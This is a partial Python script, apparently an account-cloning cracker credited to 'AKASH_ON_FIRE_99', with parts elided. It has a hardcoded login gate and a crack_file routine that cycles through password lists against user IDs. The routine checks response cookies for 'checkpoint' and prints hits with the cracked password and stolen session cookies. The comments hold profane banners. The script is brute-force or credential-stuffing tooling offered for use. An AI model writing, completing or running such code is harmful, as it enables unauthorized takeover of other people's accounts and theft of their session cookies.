#MAKED-BY-AKASH-VAU
#GITHUB-AKASH_ON_FIRE_99-71
#ACTIVE FILE CLONING
#ONLY ACTIVE ACCOUNT FOR GAME ACCOUNT USE FILE 10000 
#DEC-FUCK-YOUR-MOM-DON'T-BYPASS-MY-COMMAND
# =[•]=[SCRIPT]=[ADMIN]=[AKASH-AKASH]=[•]=
#------------------[ Install-1 ]-------------------#
#---[ FUCKED BY - @AKASH_ON_FIRE_99_99 ]
#---[ FUCKED BY - @AKASH_ON_FIRE_99 ]
#---[ FUCKED BY - @AKASH_ON_FIRE_99 ]
#-----------------[ AKASH VAI ]-------------------# 
...
while attemps < 12345677901:
    ...
    if username == 'AKASH' and password == 'AKAS':
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • CEO AKASH-71  FIRE (⚡)
\033[0;92m • FILE CLONING ACTIVE FIRE (🔥)
\033[0;92m • VERSION [ 6.9 ] PAID (😻)
  \033[0;92m═════════════════════════════════════════════ \033[1;31m""")
def login():
    banner()
...
def crack_file():
    os.system('clear')
    banner()
    os.system('espeak -a 300 " your file name akash vai i love you"')
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                #AKASH-King
                print(f'\r\033[0;92m[AKASH-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
                print('\033[0;94m===============================================')
...
#---[ Dec By - AKASH_ON_FIRE_99 ]
#--[ ALL BUG FIXED BY - AKASH_ON_FIRE_99 ]